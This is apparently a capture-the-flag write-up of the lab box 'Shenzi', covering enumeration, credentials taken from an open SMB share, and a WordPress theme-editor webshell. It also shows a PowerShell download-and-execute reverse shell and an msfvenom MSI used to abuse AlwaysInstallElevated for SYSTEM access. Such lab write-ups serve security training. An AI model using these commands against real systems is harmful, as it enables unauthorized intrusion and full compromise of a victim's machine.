# Shenzi
## Enumeration
### Nmap scan
```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.107.55/dashboard/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.107.55/dashboard/
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL, RPCCheck, SMBProgNeg: 
|_    Host '192.168.49.107' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
```

```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi$ sudo nmap -p- -oN shenzi-scan-all-ports.nmap 192.168.107.55 -Pn

PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
5040/tcp open  unknown

```

### 21/tcp
#### Technologies
- FileZilla Server version 0.9.41 beta
	- No exploits found

- Running nmap against port 21
```bash
sudo nmap -p21 -oN tcp21/tcp21_ftp.nmap --script=ftp-anon.nse,ftp-bounce.nse,ftp-libopie.nse,ftp-proftpd-backdoor.nse,ftp-syst.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse 192.168.107.55 -Pn

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
```

- Banner grabbing
```bash
ftp 192.168.107.55
Connected to 192.168.107.55.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
```


### 80/tcp
#### Technologies
- Apache 2.4.43 (Win64)
- OpenSSL/1.1.1g
- PHP/7.4.6


#### `http://192.168.107.55`
- Capture HTTP header
```bash
curl -L -I "http://192.168.107.55"

HTTP/1.1 302 Found
Date: Sat, 14 Jan 2023 19:39:19 GMT
Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
X-Powered-By: PHP/7.4.6
Location: http://192.168.107.55/dashboard/
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 14 Jan 2023 19:39:19 GMT
Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
Last-Modified: Mon, 18 May 2020 06:55:42 GMT
ETag: "1d98-5a5e6a6bcb780"
Accept-Ranges: bytes
Content-Length: 7576
Content-Type: text/html
```

- Running `Gobuster` scan
```bash
gobuster dir -u http://"$IP" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 10 -x html,php,js,txt,bak,asp,aspx -o root.gob -b 400,403,404

/index.php            (Status: 302) [Size: 0] [--> http://192.168.107.55/dashboard/]
/img                  (Status: 301) [Size: 338] [--> http://192.168.107.55/img/]    
/applications.html    (Status: 200) [Size: 3607]                                    
/examples             (Status: 503) [Size: 1060]                                    
/dashboard            (Status: 301) [Size: 344] [--> http://192.168.107.55/dashboard/]
/xampp                (Status: 301) [Size: 340] [--> http://192.168.107.55/xampp/]
```

- Running `Nikto` scan
```bash
nikto -host 192.168.107.55 -output nikto-results.txt
---------------------------------------------------------------------------
+ Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+ Retrieved x-powered-by header: PHP/7.4.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://192.168.107.55/dashboard/
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-01-14 15:41:20 (GMT-5) (346 seconds)
---------------------------------------------------------------------------
```


#### `http://192.168.107.55/shenzi`
- Trying share name on web application gives a freshly installed WordPress site
- Found possible credentials in the `Shenzi` share
	- `admin:FeltHeadwallWight357` - ACCEPTS
- With credentials we may be able to get RCE through panel
	- Appearance > Theme Editor > 404 Template (On the right)
	- Copy and pasting [WhiteWinterWolf/wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
	- Navigating to `https://192.168.107.55/shenzi/wp-content/themes/twentytwenty/404.php` gives us a webshell interface
	- I input `dir` into the `Cmd` field and get a directory listing of `C:\xampp\htdocs\shenzi\wp-content\themes\twentytwenty`
	- Testing if I can connect back (test for reverse shell). I input `ping -n 4 192.168.49.107` into the `Cmd` field and start `tcpdump -i tun0 icmp` - SUCCESS

- Running `Gobuster` scan 
```bash
gobuster dir -u http://"$IP"/shenzi/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 10 -x html,php,js,txt,bak,asp,aspx -o gobuster/shenzi.gob -b 400,403,404

/index.php            (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/]
/rss                  (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/feed/]
/login                (Status: 302) [Size: 0] [--> http://192.168.107.55/shenzi/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/0/]          
/feed                 (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/feed/]       
/atom                 (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/feed/atom/]  
/s                    (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/sample-page/]
/wp-content           (Status: 301) [Size: 352] [--> http://192.168.107.55/shenzi/wp-content/]
/admin                (Status: 302) [Size: 0] [--> http://192.168.107.55/shenzi/wp-admin/]    
/h                    (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/2020/05/28/hello-world/]
/wp-login.php         (Status: 200) [Size: 4945]                                                        
/rss2                 (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/feed/]                  
/license.txt          (Status: 200) [Size: 19915]                                                       
/wp-includes          (Status: 301) [Size: 353] [--> http://192.168.107.55/shenzi/wp-includes/]         
/readme.html          (Status: 200) [Size: 7278]                                                        
/wp-register.php      (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/wp-login.php?action=register]
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/feed/]                       
/sa                   (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/sample-page/]                
/rdf                  (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/feed/rdf/]                   
/page1                (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/]                            
/sample               (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/sample-page/]                
/'                    (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/]                            
/dashboard            (Status: 302) [Size: 0] [--> http://192.168.107.55/shenzi/wp-admin/]                   
/he                   (Status: 301) [Size: 0] [--> http://192.168.107.55/shenzi/2020/05/28/hello-world/]
```


### 139/tcp 445/tcp
- Running safe nmap script first
```bash
Default@kali:/usr/share/nmap/scripts$ ls smb* | xargs grep "safe" | cut -d ':' -f 1 | uniq | sed -z 's/\n/,/g'
smb2-capabilities.nse,smb2-security-mode.nse,smb2-time.nse,smb2-vuln-uptime.nse,smb-brute.nse,smb-double-pulsar-backdoor.nse,smb-enum-services.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-protocols.nse,smb-security-mode.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse

Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/tcp139$ sudo nmap -p139,445 --script=smb2-capabilities.nse,smb2-security-mode.nse,smb2-time.nse,smb2-vuln-uptime.nse,smb-brute.nse,smb-double-pulsar-backdoor.nse,smb-enum-services.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-protocols.nse,smb-security-mode.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse -oN smb_safe.nmap -Pn 192.168.107.55

PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb2-capabilities: 
|   2.0.2: 
|     Distributed File System
|   2.1: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.0.2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.1.1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-protocols: 
|   dialects: 
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-time: 
|   date: 2023-01-14T20:40:36
|_  start_date: N/A
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_smb-vuln-ms10-054: false
```

- Running `smbmap` with NULL credentials
```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/tcp139_445$ smbmap -u '' -p '' -H 192.168.107.55   
[!] Authentication error on 192.168.107.55
```
- Running `smbclient` with NULL credentials
```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/tcp139_445$ smbclient -L \\\\192.168.107.55              
Password for [WORKGROUP\Default]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.107.55 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- This gets us a share `Shenzi`
- Attempting access to `Shenzi` share via `smbclient`
```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/tcp139_tcp445$ smbclient \\\\192.168.107.55\\Shenzi -N
Try "help" to get a list of possible commands.
smb: \> 
```

- Recursivly download everything
```bash
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \passwords.txt of size 894 as passwords.txt (4.7 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \readme_en.txt of size 7367 as readme_en.txt (40.9 KiloBytes/sec) (average 22.2 KiloBytes/sec)
getting file \sess_klk75u2q4rpgfjs3785h6hpipp of size 3879 as sess_klk75u2q4rpgfjs3785h6hpipp (24.8 KiloBytes/sec) (average 23.0 KiloBytes/sec)
getting file \why.tmp of size 213 as why.tmp (1.1 KiloBytes/sec) (average 17.2 KiloBytes/sec)
getting file \xampp-control.ini of size 178 as xampp-control.ini (1.1 KiloBytes/sec) (average 14.2 KiloBytes/sec)
```
- Can we upload?
```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/tcp139_tcp445/shenzi_share$ smbclient \\\\192.168.107.55\\Shenzi -N          
Try "help" to get a list of possible commands.
smb: \> put readme.txt
NT_STATUS_ACCESS_DENIED opening remote file \readme.txt
smb: \>
```

#### SMB Share - Shenzi files
- passwords.txt - List of passwords for technologies being used in the web application
	- MySQL (phpMyAdmin)
		- User: root
		- Password: (no password)
	- FileZilla FTP
		- You have to create a new user on the FileZilla Interface
	- Mercury
		- Postmaster: Postmaster (pastmaster@localhost)
		- Administrator: Admin (admin@localhost)
		- User: newuser
		- Password: wampp
	- WEBDAV
		- User: xampp-dav-unsecure
		- Password: ppmax2011
	- WordPress
		- User: admin
		- Password: FeltHeadwallWight357
- readme_en.txt - Readme for XAMPP. It warns of the developers to not use XAMPP in production (which it is) and lists the missing security features:
	- The MySQL administrator (root) has no password.
	- The MySQL daemon is accessible via network.
	- phpMyAdmin is accessible via network.
	- Examples are accessible via network.
- sess_klk75u2q4rpgfjs3785h6hpipp - Possibly a session cookie? It's in a very odd JSON looking format
- why.tmp - Explains the existence of the tmp folder. PHP needs it for saving the sessions.
- xampp-control.ini - Possibly configurations

## Foothold
- Using `smbclient` you find an open share `shenzi`
```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/tcp139_445$ smbclient -L \\\\192.168.107.55              
Password for [WORKGROUP\Default]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.107.55 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- This allows for NULL session
```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/tcp139_tcp445$ smbclient \\\\192.168.107.55\\Shenzi -N
Try "help" to get a list of possible commands.
smb: \>
```
- There is a file called `passwords.txt` which contain credentials for the technologies being used in the web application. 
	- The credential `admin:FeltHeadwallWight357` for a WordPress website seemed like the most interesting one
- Using the share name `shenzi` there is a hidden directory for `http://192.168.107.55/shenzi/` which contains a WordPress site
- The credentials `admin:FeltHeadwallWight357` allow you to login at `http://192.168.107.55/shenzi/wp-login.php` 
- You can perform the Panel RCE
	- Appearance > Theme Editor > 404 Template (on the right side)
	- I copy and paste [WhiteWinterWolf/wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) into the file contents
	- Navigating to `https://192.168.107.55/shenzi/wp-content/themes/twentytwenty/404.php` gives us a webshell interface
	- I input `dir` into the `Cmd` field and get a directory listing of `C:\xampp\htdocs\shenzi\wp-content\themes\twentytwenty`

- I setup the reverse shell by downloading [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) 
	- Don't forget to put `Invoke-PowerShellTcp -Reverse -IpAddress <IP> -Port <PORT>` at the bottom of the script
- Host the script on a web server using `python3 -m http.server`
	- I noticed that I could only reach my webserver if it was listening on port 80
	- To catch a reverse shell I had to put `Start-Sleep -Seconds 10` before my `Invoke-PowerShellTcp` in `shell.ps1`. This gave me enough time to kill the python3 webserver and run `nc -lnvp 80`.
- Start your Netcat listener `nc -lnvp 80`
- In the webshell, initiate the command `powershell iex(new-object net.webclient).downloadstring('http://192.168.49.107:8000/shell.ps1')`

```bash
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi$ nc -lnvp 80  
listening on [any] 80 ...
connect to [192.168.49.107] from (UNKNOWN) [192.168.107.55] 64892
Windows PowerShell running as user shenzi on SHENZI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\shenzi\wp-content\themes\twentytwenty>whoami
shenzi\shenzi
```

## Privilege Escalation
- You start out as `shenzi\shenzi`
- User Privileges
```powershell
PS C:\Program Files> whoami /all

USER INFORMATION
----------------

User Name     SID                                           
============= ==============================================
shenzi\shenzi S-1-5-21-2141929748-2461147466-4258878046-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

```

- Ran winPEASany.exe on the host. Interesting finds:
```powershell
[+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
DefaultDomainName             :  SHENZI
DefaultUserName               :  shenzi

httpd(6092)[c:\xampp\apache\bin\httpd.exe] -- POwn: shenzi
Permissions: Authenticated Users [WriteData/CreateFiles]
Possible DLL Hijacking folder: c:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
Command Line: c:\xampp\apache\bin\httpd.exe

FileZillaServer(6044)[c:\xampp\filezillaftp\filezillaserver.exe] -- POwn: shenzi
Permissions: Authenticated Users [WriteData/CreateFiles]
Possible DLL Hijacking folder: c:\xampp\filezillaftp (Authenticated Users [WriteData/CreateFiles])
Command Line: c:\xampp\filezillaftp\filezillaserver.exe -compat -start

httpd(6260)[C:\xampp\apache\bin\httpd.exe] -- POwn: shenzi
Permissions: Authenticated Users [WriteData/CreateFiles]
Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
Command Line: C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache

AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
```


- Verifying AlwaysInstallElevated
```powershell
PS C:\Users\shenzi\Documents> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


PS C:\Users\shenzi\Documents> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
- Generate malicious MSI file
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.107 LPORT=80 -f msi -o reverse.msi
```
- After transferring it to the victim machine I install and execute with a reverse shell running on port 80 - `nc -lnvp 80`
```powershell
PS C:\Users\shenzi\Documents> Invoke-WebRequest -Uri "http://192.168.49.107/reverse.msi" -OutFile "C:\Users\shenzi\Documents\reverse.msi"
PS C:\Users\shenzi\Documents> msiexec /quiet /qn /i C:\Users\shenzi\Documents\reverse.msi
```
- This gets me a reverse shell as SYSTEM
```powershell
Default@kali:~/Documents/Repos/cerberus-bytes/Cerberus-bytes/ProvingGrounds/shenzi/privilege-escalation$ nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.49.107] from (UNKNOWN) [192.168.107.55] 64966
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>
```